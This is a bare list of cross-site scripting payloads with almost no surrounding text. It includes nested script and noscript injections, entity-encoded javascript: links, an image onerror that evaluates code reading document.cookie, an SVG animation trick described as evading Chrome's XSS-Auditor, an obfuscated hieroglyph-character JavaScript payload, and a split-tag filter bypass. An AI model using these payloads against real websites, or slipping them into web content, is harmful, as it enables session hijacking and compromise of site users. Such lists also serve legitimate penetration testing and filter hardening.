<output>
<noscript onerror=prompt(0);><a href="javascript:alert("XSS")>XSS</a>"><script onerror="<noscript onerror="<script>alert("XSS")</script>"><IMG src=<script src="/">alert(" "XSS" ")</script></noscript>"<script>alert("XSS")</script></noscript>
</output>
<a href="javascript&colon;alert&lpar;document&period;domain&rpar;">Click Here</a>

<img src=x onerror="eval('alert(document.cookie)')"/>
<IMG SRC=javascript:alert(&quot;XSS&quot;)>
<svg><animate xlink:href=#x attributeName=href values=&#106;avascript:alert(1) /><a id=x><rect width=100 height=100 /></a>This payload injects a malicious script into an SVG element. The script sets the href attribute of the animate element to javascript:alert(1), which will execute the alert function when clicked. Since the script is injected into an SVG element, the Chrome XSS-Auditor fails to detect it.
<a href=”#” onclick=”… var input=’controllable data here’; …”>


𓅂='',𓂀=!𓅂+𓅂,𓁄=!𓂀+𓅂,𓊎=𓅂+{},𓆣=𓂀
[𓅂++],𓊝=𓂀[𓇎=𓅂],𓏢=++𓇎+𓅂,𓆗=𓊎[𓇎+𓏢
],𓂀[𓆗+=𓊎[𓅂]+(𓂀.𓁄+𓊎)[𓅂]+𓁄[𓏢]+𓆣+
𓊝+𓂀[𓇎]+𓆗+𓆣+𓊎[𓅂]+𓊝][𓆗](𓁄[𓅂]+𓁄[
𓇎]+𓂀[𓏢]+𓊝+𓆣+'`𓅂 𓏢 𓂀 𓁄 𓆣 𓊝 𓇎`')``

<</div>script</div>>alert()<</div>/script</div>>
